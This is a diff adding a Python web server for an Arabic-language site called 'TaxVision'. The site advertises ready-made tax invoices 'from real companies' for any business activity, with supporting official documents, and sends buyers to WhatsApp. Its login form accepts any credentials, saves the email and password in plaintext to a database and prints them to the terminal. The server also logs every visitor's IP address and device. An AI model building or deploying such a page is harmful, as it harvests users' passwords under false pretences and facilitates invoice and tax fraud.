@@ -1,0 +1,739 @@
+import http.server
+import socketserver
+import json
+import sqlite3
+from datetime import datetime
+
+# ==================== التكوينات ====================
+PORT = 8080
+WHATSAPP_NUMBER = "201004765443"
+SITE_NAME = "TaxVision"
+SITE_URL = "taxvision"
+
+# ==================== قاعدة البيانات ====================
+def init_database():
+    conn = sqlite3.connect('visitors.db')
+    cursor = conn.cursor()
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS visitors (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            ip_address TEXT,
+            device_info TEXT,
+            user_agent TEXT,
+            visit_time TIMESTAMP,
+            page_visited TEXT
+        )
+    ''')
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            email TEXT,
+            password TEXT,
+            ip_address TEXT,
+            device_info TEXT,
+            login_time TIMESTAMP
+        )
+    ''')
+    
+    conn.commit()
+    conn.close()
+
+def log_visitor(ip, device_info, user_agent, page):
+    try:
+        conn = sqlite3.connect('visitors.db')
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO visitors (ip_address, device_info, user_agent, visit_time, page_visited)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (ip, device_info, user_agent, datetime.now(), page))
+        conn.commit()
+        conn.close()
+    except:
+        pass
+
+def save_user(email, password, ip, device_info):
+    try:
+        conn = sqlite3.connect('visitors.db')
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO users (email, password, ip_address, device_info, login_time)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (email, password, ip, device_info, datetime.now()))
+        conn.commit()
+        conn.close()
+        return True
+    except:
+        return False
+
+def get_device_info(user_agent):
+    ua = user_agent.lower()
+    if 'android' in ua:
+        return 'Android'
+    elif 'iphone' in ua or 'ipad' in ua:
+        return 'iOS'
+    elif 'windows' in ua:
+        return 'Windows'
+    elif 'mac' in ua:
+        return 'Mac'
+    else:
+        return 'غير معروف'
+
+# ==================== HTML ====================
+MAIN_PAGE = f'''<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TaxVision | الحل الأمثل للفواتير الضريبية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0a0f1a, #0f172a, #1e1b4b);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }}
+        @keyframes float {{ 0%,100% {{ transform: translateY(0px); }} 50% {{ transform: translateY(-20px); }} }}
+        @keyframes glow {{ 0%,100% {{ text-shadow: 0 0 5px rgba(99,102,241,0.5); }} 50% {{ text-shadow: 0 0 30px rgba(99,102,241,0.8); }} }}
+        @keyframes slideIn {{ from {{ opacity: 0; transform: translateX(50px); }} to {{ opacity: 1; transform: translateX(0); }} }}
+        @keyframes pulse {{ 0%,100% {{ transform: scale(1); }} 50% {{ transform: scale(1.05); }} }}
+        @keyframes rotate {{ from {{ transform: rotate(0deg); }} to {{ transform: rotate(360deg); }} }}
+        @keyframes fadeIn {{ from {{ opacity: 0; transform: scale(0.9); }} to {{ opacity: 1; transform: scale(1); }} }}
+        @keyframes borderGlow {{
+            0%,100% {{ border-color: rgba(99,102,241,0.3); box-shadow: 0 0 5px rgba(99,102,241,0.2); }}
+            50% {{ border-color: rgba(99,102,241,0.8); box-shadow: 0 0 20px rgba(99,102,241,0.5); }}
+        }}
+        
+        .navbar {{
+            background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(20px);
+            padding: 1rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+        }}
+        .logo {{
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: glow 2s ease-in-out infinite;
+        }}
+        .logo span {{
+            background: linear-gradient(135deg, #f59e0b, #ef4444);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }}
+        .login-btn {{
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: white;
+            padding: 10px 28px;
+            border-radius: 50px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.3s;
+        }}
+        .login-btn:hover {{
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(99,102,241,0.5);
+        }}
+        .user-info {{
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: rgba(99,102,241,0.2);
+            padding: 8px 20px;
+            border-radius: 50px;
+            border: 1px solid rgba(99,102,241,0.5);
+        }}
+        .user-info span {{
+            color: #a855f7;
+            font-weight: 500;
+        }}
+        .logout-btn {{
+            background: rgba(255,255,255,0.15);
+            color: white;
+            padding: 5px 18px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 0.85rem;
+            transition: all 0.3s;
+        }}
+        .logout-btn:hover {{
+            background: rgba(255,255,255,0.3);
+        }}
+        .hero {{
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 120px 5% 60px;
+            position: relative;
+            overflow: hidden;
+        }}
+        .hero::before {{
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(99,102,241,0.08) 0%, transparent 70%);
+            animation: rotate 25s linear infinite;
+        }}
+        .hero-content {{
+            position: relative;
+            z-index: 10;
+            animation: slideIn 1s ease-out;
+        }}
+        .hero h1 {{
+            font-size: 4rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6, #a855f7, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+            animation: glow 2s ease-in-out infinite;
+        }}
+        .hero p {{
+            font-size: 1.2rem;
+            color: rgba(255,255,255,0.8);
+            margin-bottom: 2rem;
+            line-height: 1.8;
+        }}
+        .search-box {{
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(10px);
+            border-radius: 80px;
+            padding: 8px 20px;
+            display: flex;
+            max-width: 650px;
+            margin: 2rem auto;
+            border: 2px solid rgba(99,102,241,0.5);
+            transition: all 0.3s;
+            animation: borderGlow 2s ease-in-out infinite;
+        }}
+        .search-box:hover {{
+            border-color: #8b5cf6;
+            box-shadow: 0 0 30px rgba(99,102,241,0.3);
+        }}
+        .search-box input {{
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 18px 25px;
+            font-size: 1.1rem;
+            color: white;
+            font-family: inherit;
+            outline: none;
+        }}
+        .search-box input::placeholder {{ color: rgba(255,255,255,0.5); font-size: 1rem; }}
+        .search-box button {{
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border: none;
+            padding: 12px 35px;
+            border-radius: 60px;
+            font-weight: 700;
+            cursor: pointer;
+            color: white;
+            transition: all 0.3s;
+        }}
+        .search-box button:hover {{
+            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(99,102,241,0.5);
+        }}
+        .search-result {{
+            margin-top: 2rem;
+            padding: 25px;
+            border-radius: 25px;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(15px);
+            display: none;
+            animation: fadeIn 0.5s ease;
+            max-width: 550px;
+            margin-left: auto;
+            margin-right: auto;
+        }}
+        .search-result.show {{
+            display: block;
+            border: 2px solid #10b981;
+            background: rgba(16,185,129,0.15);
+        }}
+        .result-icon {{ font-size: 3rem; margin-bottom: 10px; }}
+        .result-title {{ font-size: 1.5rem; font-weight: 700; margin-bottom: 12px; color: #f59e0b; }}
+        .result-message {{ font-size: 1rem; color: rgba(255,255,255,0.9); line-height: 1.6; margin-bottom: 15px; }}
+        .contact-now-btn {{
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            padding: 12px 32px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            animation: pulse 1.5s ease-in-out infinite;
+            margin-top: 10px;
+        }}
+        .floating-badge {{
+            display: inline-block;
+            background: rgba(99,102,241,0.2);
+            backdrop-filter: blur(10px);
+            padding: 12px 28px;
+            border-radius: 60px;
+            margin-top: 2rem;
+            animation: float 3s ease-in-out infinite;
+            border: 1px solid rgba(99,102,241,0.4);
+            color: #a855f7;
+        }}
+        .cards-section, .documents {{
+            padding: 80px 5%;
+            background: linear-gradient(135deg, #0a0f1a, #0f172a);
+        }}
+        .section-title {{
+            text-align: center;
+            font-size: 2.3rem;
+            color: #a855f7;
+            margin-bottom: 3rem;
+            position: relative;
+        }}
+        .section-title::after {{
+            content: '';
+            position: absolute;
+            bottom: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #8b5cf6, #a855f7, transparent);
+        }}
+        .features-grid {{
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }}
+        .feature-card {{
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+            transition: all 0.4s;
+            border: 1px solid rgba(99,102,241,0.3);
+            animation: float 4s ease-in-out infinite;
+        }}
+        .feature-card:hover {{
+            transform: translateY(-10px);
+            border-color: #8b5cf6;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }}
+        .feature-icon {{
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+        }}
+        .feature-icon i {{ font-size: 2.5rem; color: white; }}
+        .feature-card h3 {{ color: #a855f7; margin-bottom: 1rem; font-size: 1.3rem; }}
+        .feature-card p {{ color: rgba(255,255,255,0.7); line-height: 1.6; }}
+        .doc-grid {{
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 1.5rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }}
+        .doc-item {{
+            background: rgba(99,102,241,0.08);
+            border-radius: 18px;
+            padding: 1.5rem;
+            text-align: center;
+            border: 1px solid rgba(99,102,241,0.3);
+            transition: all 0.3s;
+        }}
+        .doc-item:hover {{
+            transform: scale(1.02);
+            background: rgba(99,102,241,0.15);
+        }}
+        .doc-item i {{ font-size: 2rem; color: #a855f7; margin-bottom: 0.8rem; display: block; }}
+        .doc-item span {{ color: rgba(255,255,255,0.8); font-size: 0.9rem; }}
+        .whatsapp-section {{
+            text-align: center;
+            padding: 70px 5%;
+            background: linear-gradient(135deg, #0f172a, #0a0f1a);
+        }}
+        .whatsapp-main-btn {{
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            padding: 18px 50px;
+            border-radius: 60px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.2rem;
+            transition: all 0.3s;
+            animation: pulse 2s ease-in-out infinite;
+        }}
+        .whatsapp-main-btn:hover {{
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(37,211,102,0.4);
+        }}
+        .modal {{
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(15px);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }}
+        .modal-content {{
+            background: linear-gradient(135deg, #0f172a, #1e1b4b);
+            border-radius: 30px;
+            padding: 40px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            border: 2px solid #8b5cf6;
+            animation: fadeIn 0.4s ease;
+        }}
+        .modal-content h2 {{ color: #a855f7; margin-bottom: 1.5rem; }}
+        .modal-content input {{
+            width: 100%;
+            padding: 14px;
+            margin: 12px 0;
+            border: none;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-family: inherit;
+            font-size: 1rem;
+            border: 1px solid rgba(99,102,241,0.3);
+        }}
+        .modal-content input:focus {{
+            outline: none;
+            border-color: #8b5cf6;
+        }}
+        .modal-content button {{
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            color: white;
+            margin-top: 1rem;
+            font-size: 1rem;
+        }}
+        .close-modal {{
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            font-size: 2rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s;
+        }}
+        .close-modal:hover {{ color: #a855f7; }}
+        .footer {{
+            background: #05070f;
+            padding: 30px 5% 20px;
+            text-align: center;
+            color: rgba(255,255,255,0.5);
+            font-size: 0.9rem;
+        }}
+        @media (max-width: 768px) {{
+            .hero h1 {{ font-size: 2rem; }}
+            .section-title {{ font-size: 1.6rem; }}
+            .search-box {{ flex-direction: column; border-radius: 30px; padding: 15px; }}
+            .search-box button {{ margin-top: 12px; width: 100%; }}
+            .navbar {{ flex-direction: column; gap: 12px; padding: 12px 5%; }}
+            .logo {{ font-size: 1.3rem; }}
+        }}
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo">✨ Tax<span>Vision</span> ✨</div>
+        <div id="authSection">
+            <button class="login-btn" onclick="openLoginModal()"><i class="fas fa-user-circle"></i> تسجيل الدخول</button>
+        </div>
+    </nav>
+
+    <section class="hero">
+        <div class="hero-content">
+            <h1>TaxVision<br>رؤيتك للفواتير الضريبية</h1>
+            <p>الحل الأمثل للفواتير الضريبية الإلكترونية والورقية<br>بأعلى معايير المصداقية والجودة</p>
+            
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="🔍 ابحث عن نشاطك التجاري..." onkeypress="handleEnter(event)">
+                <button onclick="searchActivity()"><i class="fas fa-search"></i> بحث</button>
+            </div>
+            
+            <div id="searchResult" class="search-result"></div>
+            
+            <div class="floating-badge">
+                <i class="fas fa-check-circle"></i> مطابق للمنظومة الضريبية 100%
+            </div>
+        </div>
+    </section>
+
+    <section class="cards-section">
+        <h2 class="section-title">✨ مميزات TaxVision ✨</h2>
+        <div class="features-grid">
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-shield-alt"></i></div><h3>فواتير رسمية</h3><p>صادرة من شركات حقيقية ومعتمدة وليست وهمية</p></div>
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-check-double"></i></div><h3>مطابقة للضريبة</h3><p>متوافقة مع منظومة الفاتورة الإلكترونية 100%</p></div>
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-file-invoice"></i></div><h3>ضمانات كاملة</h3><p>نوفر جميع المستندات الرسمية والضمانات</p></div>
+            <div class="feature-card"><div class="feature-icon"><i class="fas fa-trophy"></i></div><h3>أسعار تنافسية</h3><p>أفضل الأسعار مع أعلى مستوى من الجودة</p></div>
+        </div>
+    </section>
+
+    <section class="documents">
+        <h2 class="section-title">📎 المستندات المرفقة مع الفاتورة 📎</h2>
+        <div class="doc-grid">
+            <div class="doc-item"><i class="fas fa-id-card"></i><span>شهادة التسجيل في ضريبة القيمة المضافة</span></div>
+            <div class="doc-item"><i class="fas fa-building"></i><span>صورة السجل التجاري</span></div>
+            <div class="doc-item"><i class="fas fa-credit-card"></i><span>صورة البطاقة الضريبية</span></div>
+            <div class="doc-item"><i class="fas fa-receipt"></i><span>إيصال استلام نقدية</span></div>
+            <div class="doc-item"><i class="fas fa-file-signature"></i><span>إقرار ضريبي</span></div>
+            <div class="doc-item"><i class="fas fa-desktop"></i><span>لقطة شاشة للتأكيد</span></div>
+        </div>
+    </section>
+
+    <div class="whatsapp-section">
+        <a href="https://wa.me/{WHATSAPP_NUMBER}?text=السلام%20عليكم%20أحتاج%20فاتورة%20ضريبية" class="whatsapp-main-btn" target="_blank">
+            <i class="fab fa-whatsapp fa-2x"></i> تواصل معنا عبر واتساب
+        </a>
+    </div>
+
+    <footer class="footer">
+        <p>© 2024 TaxVision - جميع الحقوق محفوظة</p>
+    </footer>
+
+    <div id="loginModal" class="modal">
+        <span class="close-modal" onclick="closeLoginModal()">&times;</span>
+        <div class="modal-content">
+            <h2><i class="fas fa-user-lock"></i> تسجيل الدخول</h2>
+            <form id="loginForm" onsubmit="return submitLogin(event)">
+                <input type="email" id="loginEmail" placeholder="البريد الإلكتروني" required>
+                <input type="password" id="loginPassword" placeholder="كلمة المرور" required>
+                <button type="submit">دخول</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        let isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';
+        let userEmail = localStorage.getItem('userEmail') || '';
+        
+        function updateAuthUI() {{
+            const authSection = document.getElementById('authSection');
+            if (isLoggedIn && userEmail) {{
+                authSection.innerHTML = `
+                    <div class="user-info">
+                        <span><i class="fas fa-user-check"></i> ${{userEmail}}</span>
+                        <a href="#" onclick="logout()" class="logout-btn">تسجيل خروج</a>
+                    </div>
+                `;
+            }} else {{
+                authSection.innerHTML = `<button class="login-btn" onclick="openLoginModal()"><i class="fas fa-user-circle"></i> تسجيل الدخول</button>`;
+            }}
+        }}
+        
+        function searchActivity() {{
+            const searchTerm = document.getElementById('searchInput').value.trim();
+            const resultDiv = document.getElementById('searchResult');
+            
+            if (searchTerm === "") {{
+                resultDiv.className = 'search-result';
+                resultDiv.innerHTML = '<div class="result-icon">🔍</div><div class="result-title">يرجى إدخال النشاط التجاري</div><div class="result-message">اكتب نشاطك التجاري وسنقوم بتوفير الفاتورة الضريبية المناسبة لك</div>';
+                resultDiv.style.display = 'block';
+                return;
+            }}
+            
+            fetch('/api/search', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{search: searchTerm}})
+            }});
+            
+            resultDiv.className = 'search-result show';
+            resultDiv.innerHTML = `
+                <div class="result-icon">✅</div>
+                <div class="result-title">✓ نشاط "${{searchTerm}}" متوفر!</div>
+                <div class="result-message">يسعدنا خدمتكم وتوفير فاتورة ضريبية معتمدة لنشاطكم التجاري بكل احترافية وبأفضل الأسعار.</div>
+                <a href="https://wa.me/{WHATSAPP_NUMBER}?text=السلام%20عليكم%20أحتاج%20فاتورة%20ضريبية%20لنشاط%20${{encodeURIComponent(searchTerm)}}" class="contact-now-btn" target="_blank"><i class="fab fa-whatsapp"></i> تواصل الآن لعمل الفاتورة</a>
+            `;
+        }}
+        
+        function handleEnter(event) {{ if (event.key === 'Enter') searchActivity(); }}
+        function openLoginModal() {{ document.getElementById('loginModal').style.display = 'flex'; }}
+        function closeLoginModal() {{ document.getElementById('loginModal').style.display = 'none'; }}
+        
+        function submitLogin(event) {{
+            event.preventDefault();
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            fetch('/api/login', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{email, password}})
+            }}).then(res => res.json()).then(data => {{
+                if(data.success) {{
+                    localStorage.setItem('isLoggedIn', 'true');
+                    localStorage.setItem('userEmail', email);
+                    isLoggedIn = true;
+                    userEmail = email;
+                    updateAuthUI();
+                    closeLoginModal();
+                    document.getElementById('loginForm').reset();
+                    alert('✓ تم تسجيل الدخول بنجاح!');
+                }}
+            }});
+            return false;
+        }}
+        
+        function logout() {{
+            localStorage.removeItem('isLoggedIn');
+            localStorage.removeItem('userEmail');
+            isLoggedIn = false;
+            userEmail = '';
+            updateAuthUI();
+            alert('تم تسجيل الخروج بنجاح');
+        }}
+        
+        updateAuthUI();
+        
+        window.onclick = function(event) {{
+            const modal = document.getElementById('loginModal');
+            if (event.target == modal) modal.style.display = 'none';
+        }}
+    </script>
+</body>
+</html>
+'''
+
+# ==================== خادم HTTP ====================
+class CustomHandler(http.server.SimpleHTTPRequestHandler):
+    
+    def do_GET(self):
+        path = self.path.split('?')[0]
+        client_ip = self.client_address[0]
+        user_agent = self.headers.get('User-Agent', 'Unknown')
+        device_info = get_device_info(user_agent)
+        log_visitor(client_ip, device_info, user_agent, path)
+        
+        if path == '/' or path == '/index.html':
+            self.send_html(MAIN_PAGE)
+        else:
+            self.send_response(404)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(b'<h1>404 - Page Not Found</h1><a href="/">Go to Home</a>')
+    
+    def do_POST(self):
+        if self.path == '/api/login':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+            client_ip = self.client_address[0]
+            user_agent = self.headers.get('User-Agent', 'Unknown')
+            device_info = get_device_info(user_agent)
+            
+            email = data.get('email', 'غير معروف')
+            password = data.get('password', 'غير معروف')
+            
+            save_user(email, password, client_ip, device_info)
+            
+            print("\n" + "=" * 60)
+            print("🔐 تسجيل دخول جديد - TaxVision")
+            print("=" * 60)
+            print(f"📧 البريد الإلكتروني: {email}")
+            print(f"🔑 كلمة المرور: {password}")
+            print(f"💻 الجهاز: {device_info}")
+            print(f"🌐 عنوان IP: {client_ip}")
+            print(f"⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            print("=" * 60 + "\n")
+            
+            self.send_json({'success': True})
+            
+        elif self.path == '/api/search':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+            client_ip = self.client_address[0]
+            user_agent = self.headers.get('User-Agent', 'Unknown')
+            device_info = get_device_info(user_agent)
+            
+            print(f"🔍 بحث: '{data.get('search', '')}' | IP: {client_ip} | جهاز: {device_info}")
+            
+            self.send_json({'success': True})
+        else:
+            self.send_json({'success': False})
+    
+    def send_html(self, content):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html; charset=utf-8')
+        self.end_headers()
+        self.wfile.write(content.encode('utf-8'))
+    
+    def send_json(self, data):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))
+    
+    def log_message(self, format, *args):
+        pass
+
+def run_server():
+    init_database()
+    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
+        print("=" * 60)
+        print("✨ TaxVision - منصة الفواتير الضريبية")
+        print("=" * 60)
+        print(f"📍 http://localhost:{PORT}")
+        print(f"🔗 الرابط: http://localhost:{PORT}/taxvision")
+        print("=" * 60)
+        print("\n✨ الميزات:")
+        print("  ✅ اسم الموقع: TaxVision (رؤية ضريبية)")
+        print("  ✅ رابط الموقع: taxvision")
+        print("  ✅ خانة البحث: 'ابحث عن نشاطك التجاري'")
+        print("  ✅ أي بحث يظهر 'النشاط متوفر' مع زر تواصل")
+        print("  ✅ تسجيل دخول (بريد + كلمة سر)")
+        print("  ✅ بعد تسجيل الدخول تختفي علامة الدخول")
+        print("  ✅ بيانات تسجيل الدخول تظهر في Terminal")
+        print("  ✅ لا يوجد رقم هاتف - التواصل فقط عبر واتساب")
+        print("\n🛑 لإيقاف الخادم: Ctrl+C\n")
+        try:
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            print("\n🛑 تم إيقاف الخادم")
+
+if __name__ == "__main__":
+    run_server()
